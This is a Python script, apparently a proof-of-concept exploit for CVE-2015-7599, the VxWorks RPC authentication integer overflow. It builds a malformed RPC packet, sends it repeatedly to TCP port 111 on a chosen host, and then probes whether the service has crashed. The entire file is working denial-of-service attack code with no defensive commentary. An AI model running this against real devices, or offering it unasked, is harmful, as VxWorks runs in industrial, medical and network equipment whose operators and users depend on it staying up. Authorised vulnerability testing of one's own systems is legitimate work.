#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""VxWorks RPC authentication integer overflow trigger (CVE-2015-7599)."""

from __future__ import annotations

import random
import socket
import struct
import time
from typing import Optional


RPC_DEFAULT_PORT = 111


def build_rpc_overflow_packet(
    xid: Optional[int] = None,
    program_version: Optional[int] = None,
    credential_flavor: Optional[int] = None,
) -> bytes:
    return struct.pack(
        "!IIIIIIIIIII",
        0x80000030,
        int(xid if xid is not None else random.randint(1, 2**32 - 1)),
        0,
        2,
        0x100000,
        int(program_version if program_version is not None else random.randint(1, 2**32 - 1)),
        0,
        int(credential_flavor if credential_flavor is not None else random.randint(1, 2**32 - 1)),
        0,
        0,
        0,
    )


def is_rpc_port_open(host: str, port: int = RPC_DEFAULT_PORT, timeout: float = 1.0) -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(float(timeout))
    try:
        return sock.connect_ex((host, int(port))) == 0
    except OSError:
        return False
    finally:
        try:
            sock.close()
        except OSError:
            pass


def trigger_rpc_integer_overflow(
    host: str,
    port: int = RPC_DEFAULT_PORT,
    count: int = 20,
    timeout: float = 2.0,
) -> int:
    sent = 0
    for _ in range(max(1, int(count))):
        packet = build_rpc_overflow_packet()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(float(timeout))
        try:
            sock.connect((host, int(port)))
            sock.sendall(packet)
            sent += 1
        except OSError:
            return sent
        finally:
            try:
                sock.close()
            except OSError:
                pass
    return sent


def probe_rpc_dos(
    host: str,
    port: int = RPC_DEFAULT_PORT,
    count: int = 20,
    timeout: float = 2.0,
    wait: float = 3.0,
) -> dict:
    before = is_rpc_port_open(host, port, min(timeout, 1.0))
    if not before:
        return {
            "host": host,
            "port": int(port),
            "reachable_before": False,
            "packets_sent": 0,
            "reachable_after": False,
            "likely_crash": False,
        }

    packets_sent = trigger_rpc_integer_overflow(host, port, count, timeout)
    if wait > 0:
        time.sleep(float(wait))
    after = is_rpc_port_open(host, port, min(timeout, 1.0))
    return {
        "host": host,
        "port": int(port),
        "reachable_before": True,
        "packets_sent": packets_sent,
        "reachable_after": after,
        "likely_crash": before and not after,
    }
